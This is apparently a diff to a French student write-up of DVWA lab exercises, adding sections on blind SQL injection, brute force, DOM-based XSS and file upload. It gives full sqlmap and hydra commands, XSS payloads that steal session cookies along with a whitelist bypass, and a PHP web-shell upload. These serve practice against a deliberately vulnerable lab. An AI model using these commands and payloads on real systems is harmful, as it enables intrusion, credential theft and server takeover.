@@ -539,6 +539,29 @@ Cependant, la requête reste très vulnérable puisque l'id est ajouter directem
 ## 3.3 Troisième niveau - hard
 
 
+## 3.4 Niveau impossible
+
+# SQL - blind
+
+## Premier niveau - low
+
+Nous allons utiliser SQLMAP pour trouver les bases de données et les afficher   
+Le principe est le meme que pour les autres injections.  
+Nous allons utiliser la commande ci-dessous :  
+```
+sqlmap -u "http://34.163.97.167/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump --fresh-queries
+```
+![images](/images/sql/9.png)
+On obtient ce resultat, `sqlmap` a donc bien trouve la DB.  
+
+Maintenant, nous allons rajouter le parametre `-T` et `-D` pour afficher la base de données des utlisateur et leurs mots de passe. Pour gagner du temps nous ne dechiffreront pas les mots de passe car la base de données est la meme qu'avant et nous l'avont deja fait
+```
+sqlmap -u "http://34.163.97.167/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump -T users -D dvwa
+```
+![images](/images/sql/10.png)
+
+## Deuxieme niveau - medium
+
 
 # 4. Brute Force
 
@@ -573,5 +596,139 @@ On va utiliser `hydra` pour essayer de bruteforce.
 La commande n'etant pas très lisible en screenshot, la voici directement :
 
 ```
-hydra -l admin -P /opt/wordlists/wordlists/passwords/most_used_passwords.txt dvwa.lan http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=po9is02drb8ohe96pq1j61flmu"
+hydra -l admin -P /opt/wordlist/wordlists/wordlists/passwords/most_used_passwords.txt dvwa.lan http-get-form "/DVWA/
+vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low:F=Username and/or password incorrect."
 ```
+![images](/images/bruteforce/2.png)
+On trouve le login qui est `admin` et le password `password`.
+
+## 4.2 Deuxieme niveau - medium
+
+Cette fois ci, on utilise une wordlist aussi pour les identifiants 
+```
+ hydra -L /opt/wordlist/wordlists/wordlists/usernames/cirt_default_usernames.txt -P /opt/wordlist/wordlists/wordlists/passwords/most_used_passwords.txt 34.163.97.167 http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low:F=Username and/or password incorrect."
+```
+
+# 5. DOM Based XSS
+
+Le DOM-Based XSS (Cross-Site Scripting) est une variante de vulnérabilité XSS où l'injection malveillante se produit dans le Document Object Model (DOM) côté client, sans jamais transiter par le serveur. Autrement dit, le code malveillant est interprété directement par le navigateur en manipulant des données dynamiques gérées dans le DOM, souvent à partir de l'URL ou d'autres entrées utilisateur.
+
+## 5.1 Premier niveau - low
+
+Nous arrivons sur une page ou l'on peux changer la langue.  
+
+![images](/images/xssDom/1.png)
+
+On remarque un parametre `GET` dans l'url qui est `default`.
+```
+http://34.163.97.167/DVWA/vulnerabilities/xss_d/?default=French
+```
+
+On va donc essayer de modifier la valeur `French` par une injection SQL basique pour voir si ca marche
+
+```
+http://34.163.97.167/DVWA/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%27info%27);%3C/script%3E
+```
+
+![images](/images/xssDom/2.png)
+
+On remarque que la page est vulnerable aux attaques XSS
+
+On va donc essayer de recuperer les cookies de session en utilisant la fonction JS `document.cookie`
+
+
+![images](/images/xssDom/3.png)
+
+On arrive bien a recuperer les cookies de session en utilisant la faille.
+On peux donc en deduire qu'il n'y a aucun filtre/protection .
+
+## 5.2 Deuxieme niveau - medium
+
+Pour le deuxieme niveau, notre hypothese est que les balises les plus simples comme `<script>` sont filtres. Il faut donc trouver un autre moyen pour trouver le cookie
+
+Apres avoir essaye d'injecter differents payload dans l'url, on se rend compte que cela ne marche pas. On va donc essayer de modifier via le mode developpeur de chrome le script manuellement.
+
+![images](/images/xssDom/4.png)
+
+On rajoute un `onclick` sur le bouton `select` qui permet d'afficher les cookies
+
+```
+<input type="submit" value="Select" onclick="alert(document.cookie)">
+```
+![images](/images/xssDom/5.png)
+
+
+On peux regarder le code et on voit qu'il y a une condition qui verifie si il y a un parametre `<script>`, comme on le pensait.
+```
+
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+    $default = $_GET['default'];
+    
+    # Do not allow script tags
+    if (stripos ($default, "<script") !== false) {
+        header ("location: ?default=English");
+        exit;
+    }
+}
+
+?>
+```
+
+## 5.3 Troisieme niveau - hard
+
+Pour celui ci, ne trouvant pas nous avons commence par regarde le code source ci-dessous :
+
+```php
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+
+    # White list the allowable languages
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            # ok
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+
+?>
+```
+L'administrateur a rajoute une White list qui permet "thoeriquement" de verifier que le parametre `default` contient bien une de langues dans le `switch case`. Le probleme c'est que l'on peux ecrire la langue pour passer la verification et ensuite injecter notre XSS
+
+On va donc injecter notre XSS apres le parametre `default` avec le caractere `&`
+```
+http://34.163.97.167/DVWA/vulnerabilities/xss_d/?default=German&<script>alert(document.cookie);</script>
+```
+
+Et le payload est fonctionnele on retrouve bien notre cookie de session.
+
+# 6. File Upload
+
+# 6.1 Premier Niveau - low
+
+Pour ce premier niveau, nous avons la possibilite d'uploader un fichier. On part du principe qu'il n'y a pas de controle sur les fichiers que l'on depose
+
+On va donc deposer un webshell `php` afin d'executer des commandes sur le serveur.  
+
+Nous utiliserons ce web shell disponible au lien suivant :
+```
+https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php
+```
+![images](/images/fileUpload/1.png)
+une fois que l'on a uploader le fichier on va l'url donne par le site
+```
+http://34.163.97.167/DVWA/hackable/uploads/test.php
+```
+
+Notre shell est bien present nous permettant de saisir des commandes 
+![images](/images/fileUpload/2.png)
